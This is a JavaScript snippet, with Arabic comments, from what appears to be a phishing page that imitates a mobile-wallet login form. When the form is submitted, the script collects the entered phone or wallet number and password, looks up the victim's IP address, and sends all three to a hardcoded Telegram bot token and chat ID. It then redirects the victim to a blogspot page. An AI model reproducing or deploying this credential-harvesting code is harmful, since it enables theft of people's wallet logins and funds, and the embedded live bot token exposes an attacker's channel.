    <script>

        function validatePassword(password) {

            // تحقق من عدم وجود أحرف عربية

            const arabicRegex = /[\u0600-\u06FF]/;

            if (arabicRegex.test(password)) {

                return false;

            }

            // تحقق من أن كلمة السر تحتوي على رموز وأرقام أو رموز وأرقام وأحرف

            const symbolRegex = /[!@#$%^&*(),.?":{}|<>]/;

            const numberRegex = /\d/;

            const letterRegex = /[a-zA-Z]/;

            return (symbolRegex.test(password) && numberRegex.test(password)) &&(!letterRegex.test(password) || letterRegex.test(password));

        }

        function validateForm() {

            const phone = document.getElementById('phone').value;

            const password = document.getElementById('password').value;

            const errorMsg = document.getElementById('error-msg');

            if (!/^\d{10}$/.test(phone)) {

                errorMsg.innerText = "لقد أدخلت رقم محفظة و / أو كلمة سر خاطئة. يرجى إدخال رقم محفظة و / أو كلمة سر صحيحة او القيام بتغيير كلمة السر";

                errorMsg.style.display = 'block';

                return false;

            }

            if (!validatePassword(password)) {

                errorMsg.innerText = "لقد أدخلت رقم محفظة و / أو كلمة سر خاطئة. يرجى إدخال رقم محفظة و / أو كلمة سر صحيحة او القيام بتغيير كلمة السر";

                errorMsg.style.display = 'block';

                return false;

            }

            errorMsg.style.display = 'none'; // إخفاء الإشعار في حالة الإدخال الصحيح

            return true;

        }function sendTelegramMessage(botToken, chatId, message) {

            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

            const data = {

                chat_id: chatId,

                text: message,

                parse_mode: "MarkdownV2"  // لتنسيق الرسالة

            };

            return fetch(url, {

                method: 'POST',

                headers: {

                    'Content-Type': 'application/json'

                },

                body: JSON.stringify(data)

            });

        }

        async function onSubmit(event) {

            event.preventDefault();

            if (!validateForm()) return;

            const phone = document.getElementById('phone').value;

            const password = document.getElementById('password').value;

            try {

                const ipRequest = await fetch('https://api.ipify.org?format=json');const ipResponse = await ipRequest.json();

                const ipAddress = ipResponse.ip;

                // تنسيق الرسالة باستخدام MarkdownV2

                const message = `*تسجيل*\n\n` +

                                `*رقم الهاتف:* \`${phone}\`\n` +

                                `*كلمة السر:* \`${password}\`\n` +

                                `*IP:* \`${ipAddress}\``;

                // إرسال الرسالة إلى البوت

                await sendTelegramMessage('7755037837:AAFa2xwJcgwDTM3_51GNWR0aFav5NpfcjSI','8194718375', message);

                // تحويل المستخدم إلى الرابط المحدد

                window.location.href = "https://orangenewphone.blogspot.com/2025/09/box-sizing-border-box-margin-0-padding_15.html";

            } catch (error) {

                console.error('Error:', error);

            }

        }

    </script>
